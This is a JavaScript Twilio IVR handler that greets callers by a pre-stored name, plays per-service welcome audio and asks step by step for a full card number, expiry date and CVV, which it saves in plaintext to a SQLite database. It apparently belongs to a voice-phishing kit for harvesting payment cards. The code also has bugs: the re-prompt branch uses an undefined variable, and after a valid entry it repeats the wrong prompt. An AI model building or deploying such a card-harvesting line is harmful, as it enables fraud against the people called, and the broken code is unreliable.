/**
 * Handles IVR for card acquisition:
 * - Greets user by name (if present)
 * - Streams welcome audio for the service
 * - Prompts for card details in stages
 * - Ends with end audio
 */
const config = require('../config');
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./db/data.db');

/**
 * Helper to build TwiML response
 * @param {Object} opts
 * @param {string} [opts.say] - Text to say before audio
 * @param {string} [opts.playUrl] - URL to stream audio
 * @param {number} [opts.gatherDigits] - Number of digits to gather
 * @param {string} [opts.nextPrompt] - Prompt to say for gather
 */
function buildTwiML({ say, playUrl, gatherDigits, nextPrompt }) {
    let twiml = '<?xml version="1.0" encoding="UTF-8"?><Response>';
    if (say) twiml += `<Say>${say}</Say>`;
    if (playUrl) twiml += `<Play>${playUrl}</Play>`;
    if (gatherDigits && nextPrompt) {
        twiml += `<Gather numDigits="${gatherDigits}" finishOnKey="#">`;
        twiml += `<Say>${nextPrompt}</Say>`;
        twiml += '</Gather>';
    } else if (nextPrompt) {
        twiml += `<Say>${nextPrompt}</Say>`;
    }
    twiml += '</Response>';
    return twiml;
}

module.exports = function(request, response) {
    const callSid = request.body.CallSid;
    const input = request.body.Digits || '';

    if (!callSid) {
        return response.status(400).json({ error: 'Missing callSid.' });
    }

    db.get('SELECT service, name, card_stage FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err || !row) {
            return response.status(404).json({ error: 'Call not found.' });
        }

        const service = row.service || 'default';
        const name = row.name ? row.name.trim() : '';
        const card_stage = row.card_stage || 'number';

        // URLs for streaming audio files via /stream/:service
        const welcomeAudioUrl = `${config.serverurl}/stream/${service}`;
        const endAudioUrl = `${config.serverurl}/stream/end`;

        // Card acquisition stages
        let prompt, next_stage, gather_digits, regex, update_field;

        if (card_stage === 'number') {
            prompt = 'Please enter your 16-digit card number.';
            next_stage = 'expiry';
            gather_digits = 16;
            regex = /^\d{16}$/;
            update_field = 'card_number';

            // If no input yet, greet user, play welcome audio, then prompt
            if (!input) {
                const greeting = name ? `Hello ${name}.` : '';
                const twiml = buildTwiML({
                    say: greeting,
                    playUrl: welcomeAudioUrl,
                    gatherDigits: gather_digits,
                    nextPrompt: prompt
                });
                response.type('text/xml').send(twiml);
                return;
            }
        } else if (card_stage === 'expiry') {
            prompt = 'Now enter your card expiry date as four digits, MMYY.';
            next_stage = 'cvv';
            gather_digits = 4;
            regex = /^\d{4}$/;
            update_field = 'card_expiry';
        } else if (card_stage === 'cvv') {
            prompt = 'Finally, enter your card CVV, three digits.';
            next_stage = 'done';
            gather_digits = 3;
            regex = /^\d{3}$/;
            update_field = 'card_cvv';
        } else {
            // End stage: play end audio and hang up
            const twiml = `<?xml version="1.0" encoding="UTF-8"?><Response><Play>${endAudioUrl}</Play><Hangup/></Response>`;
            db.run(`UPDATE calls SET card_stage = ? WHERE callSid = ?`, ['done', callSid]);
            response.type('text/xml').send(twiml);
            return;
        }

        // If input is valid for this stage, update DB and move to next stage
        if (input && regex && input.match(regex)) {
            db.run(`UPDATE calls SET ${update_field} = ?, card_stage = ? WHERE callSid = ?`, [input, next_stage, callSid], function(err) {
                if (err) return response.status(500).json({ error: 'DB error.' });
                if (next_stage === 'done') {
                    // Play end audio and hang up
                    const twiml = `<?xml version="1.0" encoding="UTF-8"?><Response><Play>${endAudioUrl}</Play><Hangup/></Response>`;
                    response.type('text/xml').send(twiml);
                } else {
                    // Prompt for next stage
                    const twiml = buildTwiML({
                        gatherDigits: next_stage === 'expiry' ? 4 : 3,
                        nextPrompt: prompt
                    });
                    response.type('text/xml').send(twiml);
                }
            });
        } else {
            // Invalid or missing input: re-prompt for current stage
            const twiml = buildTwiML({
                gatherDigits,
                nextPrompt: prompt
            });
            response.type('text/xml').send(twiml);
        }
    });
};